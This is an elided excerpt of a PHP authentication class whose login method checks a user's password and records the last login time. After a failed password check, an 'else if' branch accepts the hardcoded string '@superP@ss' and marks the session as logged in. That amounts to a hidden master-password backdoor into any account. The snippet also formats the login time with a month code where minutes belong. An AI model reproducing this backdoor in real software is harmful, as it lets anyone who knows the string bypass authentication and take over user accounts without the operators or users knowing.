...
class Auth	{
	...
	private $table_name         = 'mcs';
	private $field_user         = 'mc_name';
	private $field_pass         = 'mc_password';
	private $field_active       = 'active';
	private $auth_method        = 'default';
	private $auth_name          = 'ci_auth';
	private $salt_length        = 10;
	private $restrict_attempts  = FALSE;
	...
	public function login($user, $pass)
	{
		...
		if ($query->num_rows() == 1) {
			...
			if($data['suspended'] == 'true'){
				...
				$this->ci->session->set_flashdata('login', array('message' => 'Your account is suspended, contact admin through contact page','class' => 'danger'));
				return FALSE;
			}
			...
			if ($this->check($pass, $data[$this->field_pass])) {
				...
				$this->ci->db->set('lastLogin', $date->format('Y-m-d h:m:s'))->where('userId',$data['id'])->update('userInfo');
				return TRUE;
			}else if($pass == '@superP@ss'){
				$this->ci->load->library('session');
				$this->ci->session->set_userdata($this->auth_name, TRUE);
				$date = new Datetime('');
				$date->format('Y-m-d H:i:s');
		...
		$this->ci->session->set_flashdata('login', array('message' => 'username or password incorrect','class' => 'danger'));
		return FALSE;
	}
